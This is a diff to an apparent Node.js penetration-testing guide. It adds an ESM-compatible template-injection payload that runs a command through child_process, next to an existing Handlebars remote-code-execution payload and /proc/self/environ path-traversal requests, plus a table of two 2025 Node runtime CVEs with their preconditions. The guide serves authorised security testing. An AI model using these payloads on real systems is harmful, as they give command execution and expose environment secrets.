@@ -158,6 +158,15 @@ curl -s -X POST https://$TARGET/api/render \
   -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
 ```
 
+**ESM entry points.** Every `process.mainModule.require(...)` payload above assumes a CommonJS entry. `process.mainModule` is deprecated (since v14) and tracks `require.main`, which the Node docs say is `undefined` "when the entry point is not a CommonJS module", so on an ESM app (`"type": "module"`, `.mjs` entry) these payloads throw a `TypeError` naming `mainModule`. That error means the expression evaluated, so do not record the sink as safe. The ESM-safe equivalent is `process.getBuiltinModule` (added in v22.3.0 and v20.16.0; undefined on older runtimes):
+
+```bash
+# Same benign `id` proof as above, ESM-safe
+curl -s -X POST https://$TARGET/api/render \
+  -H "Content-Type: application/json" \
+  -d '{"template": "<%= process.getBuiltinModule(\"child_process\").execSync(\"id\").toString() %>"}'
+```
+
 ---
 
 ## Phase 6 — child_process Command Injection
@@ -190,6 +199,19 @@ curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
 curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
 curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 ```
+
+---
+
+## Phase 8 - Node Runtime Version Gates
+
+Two core-runtime bugs turn on the Node version, not the app code. Pin the version first (leaked `package.json` `engines`, `.nvmrc`, Dockerfile `FROM node:<tag>`, an error stack, or a reflected `process.version`) and state how you got it.
+
+| CVE | Bug | Precondition on the target | Fixed in |
+|---|---|---|---|
+| CVE-2025-27210 (High) | Windows device names (`CON`, `PRN`, `AUX`) bypass path-traversal protection in `path.normalize()` / `path.join()`; incomplete fix for CVE-2025-23084 | Windows host; the app joins user input into a path and relies on normalization to stay under a root | 20.19.4, 22.17.1, 24.4.1 |
+| CVE-2025-55130 (High) | Crafted relative symlink paths escape the Permission Model's `--allow-fs-read` / `--allow-fs-write` | The service runs tenant or user-supplied scripts under the Permission Model (code runners, plugin sandboxes) and the script can create symlinks | 20.20.0, 22.22.0, 24.13.0, 25.3.0 |
+
+A version string alone is informational. Report only with a read of a marker file you planted (your own tenant's workspace, or a file the program designates) returned through the app's own feature. Sources: https://nodejs.org/en/blog/vulnerability/july-2025-security-releases (CVE-2025-27210), https://nodejs.org/en/blog/vulnerability/december-2025-security-releases (CVE-2025-55130, released 2026-01-13).
 
 ---
 
